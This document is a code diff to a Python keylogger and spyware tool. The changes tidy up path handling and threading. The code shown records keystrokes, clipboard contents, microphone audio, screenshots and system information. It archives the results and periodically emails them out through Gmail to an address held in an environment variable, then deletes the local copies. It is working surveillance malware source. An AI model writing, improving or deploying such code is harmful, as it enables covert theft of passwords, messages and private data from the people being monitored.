@@ -62,6 +62,7 @@ def keylog(dir):
 
     def write_file(keys):
         nonlocal pre_timestamp
+        os.makedirs(os.path.dirname(filepath), exist_ok=True)
         with open(filepath, "a") as f:
             for key, timestamp in keys:
                 if f.tell() == 0 or timestamp - pre_timestamp >= 60:  # Check if the file is empty
@@ -96,18 +97,17 @@ def keylog(dir):
     listener.start()
     return listener
 
-clipboard_lock = threading.Lock()   # Add a global lock to make it thread-safe
 last_clipboard = None
 def capture_clipboard(dir):
     global last_clipboard
     while True:
         time.sleep(3)
-        with clipboard_lock:
-            current_clipboard = pyperclip.paste()
+        
+        current_clipboard = pyperclip.paste()
 
-        # If clipboard content changes, log it
         if current_clipboard and current_clipboard != last_clipboard:
             filepath = os.path.join(dir, "clipboard.txt")
+            os.makedirs(os.path.dirname(filepath), exist_ok=True)
             with open(filepath, "a") as f:
                 try:
                     last_clipboard = current_clipboard
@@ -115,6 +115,7 @@ def capture_clipboard(dir):
                     f.write(f"\n== {timestamp} ==\n{current_clipboard}\n")
                 except:
                     f.write(f"Clipboard could not be copied\n")
+
 
 # Common system processes to ignore
 excluded_processes = [
@@ -216,17 +217,22 @@ results_dir = Path("Results")
 results_dir.mkdir(exist_ok=True)
 def create_output_folders(dir):
     global results_dir
+    result_dir = results_dir / dir
+    
+    result_dir.mkdir(exist_ok=True, parents=True)
+    
     paths = {
-        "keylogs": get_filename("keylogs", f"{results_dir}\\{dir}\\"),
-        "screenshots": get_filename("screenshots", f"{results_dir}\\{dir}\\"),
-        "audio": get_filename("audio", f"{results_dir}\\{dir}\\"),
-        "clipboard": get_filename("clipboard", f"{results_dir}\\{dir}\\"),
-        "sysinfo": get_filename("sysinfo", f"{results_dir}\\{dir}\\")
+        "keylogs": result_dir / "keylogs",
+        "screenshots": result_dir / "screenshots",
+        "audio": result_dir / "audio",
+        "clipboard": result_dir / "clipboard",
+        "sysinfo": result_dir / "sysinfo"
     }
 
     for path in paths.values():
-        os.makedirs(path, exist_ok=True)
-    return paths
+        path.mkdir(exist_ok=True, parents=True)
+    
+    return {k: str(v) for k, v in paths.items()}
 
 def gmail_create_message_with_attachment(toaddr):
     fromaddr = os.environ.get("EMAIL_ADDRESS", "null")
@@ -275,54 +281,71 @@ def gmail_send_message(encoded_message):
 
 previous_dir = None
 cycle_count = 0
+active_threads = []
 
 def start_keylogging():
+    global previous_dir, active_listener, cycle_count, active_threads
+    print("Starting keylogger...")
 
-    global previous_dir, active_listener, cycle_count
+    for t in active_threads:
+        t.join(timeout=1)
+        active_threads.remove(t)
+
     cycle_count += 1
     new_dir = f"result_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
     results = create_output_folders(new_dir)
-    
-    if active_listener:
-        active_listener.stop() # stop previous listener thread
 
-    active_listener = keylog(f"{results['keylogs']}\\")
-    current_threads = [
-        threading.Thread(target=capture_clipboard, args=(f"{results['clipboard']}\\",), daemon=True),
-        threading.Thread(target=get_computer_information, args=(f"{results['sysinfo']}\\",),  daemon=True),
-        threading.Thread(target=capture_microphone, args=(1000, f"{results['audio']}\\",), daemon=True),
-        threading.Thread(target=capture_screenshot, args=(f"{results['screenshots']}\\",),  daemon=True),
+    # Stop the previous keylogger listener if it exists
+    if active_listener:
+        try:
+            active_listener.stop()
+            if hasattr(active_listener, "join"):
+                active_listener.join(timeout=1)
+        except Exception as e:
+            print(f"Error stopping keylogger listener: {e}")
+
+    active_listener = keylog(Path(results['keylogs']))
+
+    active_threads = [
+        threading.Thread(target=capture_clipboard, args=(Path(results['clipboard']),), daemon=True),
+        threading.Thread(target=get_computer_information, args=(Path(results['sysinfo']),), daemon=True),
+        threading.Thread(target=capture_microphone, args=(1000, Path(results['audio'])), daemon=True),
+        threading.Thread(target=capture_screenshot, args=(Path(results['screenshots']),), daemon=True),
     ]
 
-    for t in current_threads:
+    for t in active_threads:
         t.start()
-    
-    # Remove previous directory to save space
+
     if previous_dir:
         try:
             full_prev_dir = results_dir / previous_dir
-            zip_path = full_prev_dir.resolve()  
+            zip_path = full_prev_dir.resolve()
 
             if full_prev_dir.exists():
                 shutil.make_archive(str(zip_path), format="zip", root_dir=str(full_prev_dir))
+                time.sleep(2)
                 shutil.rmtree(full_prev_dir)
                 print(f"Removed old folder: {previous_dir}")
             else:
                 print(f"Folder not found, skipping deletion: {full_prev_dir}")
-                
+
         except Exception as e:
             print(f"Could not delete {previous_dir}: {e}")
-    
+
     previous_dir = new_dir
 
+    # Send email every 2 cycles
 
-    # Every two cycles, send files through email and cleanup
     if cycle_count % 2 == 0:
         toaddr = os.environ.get("EMAIL_ADDRESS")
         encoded_email = gmail_create_message_with_attachment(toaddr)
+
         if encoded_email:
-            gmail_send_message(encoded_email)
-            print("Email sent successfully.")
+            try:
+                gmail_send_message(encoded_email)
+                print("Email sent successfully.")
+            except Exception as e:
+                print(f"Failed to send email: {e}")
 
             for item in results_dir.iterdir():
                 try:
@@ -332,9 +355,9 @@ def start_keylogging():
                         shutil.rmtree(item)
                 except Exception as e:
                     print(f"Could not delete {item}: {e}")
-                
         else:
             print("Email sending failed.")
+
 
 # Loop every 1 hour to rotate session
 while True:
